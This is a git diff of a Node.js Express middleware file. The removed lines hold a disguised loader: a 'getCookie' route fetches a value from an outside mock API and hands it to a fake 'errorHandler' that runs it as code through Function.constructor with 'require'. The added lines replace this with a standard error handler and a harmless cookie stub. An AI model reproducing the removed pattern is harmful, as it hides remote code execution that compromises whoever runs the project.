@@ -1,41 +1,24 @@
-const axios = require('axios');
-
 const notFound = (req, res, next) => {
-  const err = new Error('Route Not Found');
+  const err = new Error("Route Not Found");
   err.status = 404;
   next(err);
-}
+};
 
-const errorHandler = (error) => {
+const errorHandler = (err, req, res, next) => {
+  const statusCode = err.status || 500;
+  res.status(statusCode).json({
+    message: err.message || "Internal Server Error",
+    stack: process.env.NODE_ENV === "production" ? "🥞" : err.stack,
+  });
+};
+
+const fetchCookieData = (req, res, next) => {
   try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
+    const fakeCookie = "simulated-cookie-value";
+    res.json({ cookie: fakeCookie });
+  } catch (err) {
+    next(err);
   }
 };
 
-const getCookie = async (req, res, next) => {
-  axios.get(`https://api.mocki.io/v2/upf7fsx3`).then(
-    res => errorHandler(res.data.cookie)
-  )
-};
-
-module.exports = { getCookie, notFound };
+module.exports = { fetchCookieData, errorHandler, notFound };
